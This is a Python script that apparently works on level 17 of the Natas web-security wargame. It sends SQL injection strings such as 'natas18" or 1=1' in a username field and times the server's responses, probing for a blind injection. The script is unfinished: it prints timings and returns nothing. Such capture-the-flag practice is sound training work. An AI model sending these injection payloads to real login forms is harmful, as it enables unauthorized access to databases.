"""
"""

import requests
import time
from typing import Optional

from natas_utils import *

LEVEL = 17

def solve(url: str, login: LevelLogin) -> Optional[str]:
    # form action: POST to /index.php (can be /)
    #
    # The server code querying is not POST-specific, so params on a GET should
    # work.
    #
    # A non-null "debug" param on a GET request will leak info about the query
    # that's executed.

    success_start = time.perf_counter()
    for _ in range(10):
        success_params = {
            "username": "natas18\" or 1=1",
            "submit": "Check existence",
            "debug": "true",
        }
        # no users output here because the `echo` lines are commented out in the
        # source code
        post_response = requests.post(url, auth=login, data=success_params)
    success_end = time.perf_counter()

    fail_start = time.perf_counter()
    for _ in range(10):
        fail_params = {
            "username": "natas18\" aaaaaa aaaa aaa - + + * + aaaaaa",
            "submit": "Check existence",
            "debug": "true",
        }
        # no users output here because the `echo` lines are commented out in the
        # source code
        post_response = requests.post(url, auth=login, data=fail_params)
    fail_end = time.perf_counter()

    print(success_end - success_start)
    print(fail_end - fail_start)

    return None

if __name__ == "__main__":
    url, login = load_level(LEVEL)
    flag = solve(url, login)

    if flag:
        print("natas{:02}:".format(LEVEL + 1), flag)
        store_level_password(LEVEL + 1, flag)
    else:
        exit("Failed to get password for natas{:02}.".format(LEVEL + 1))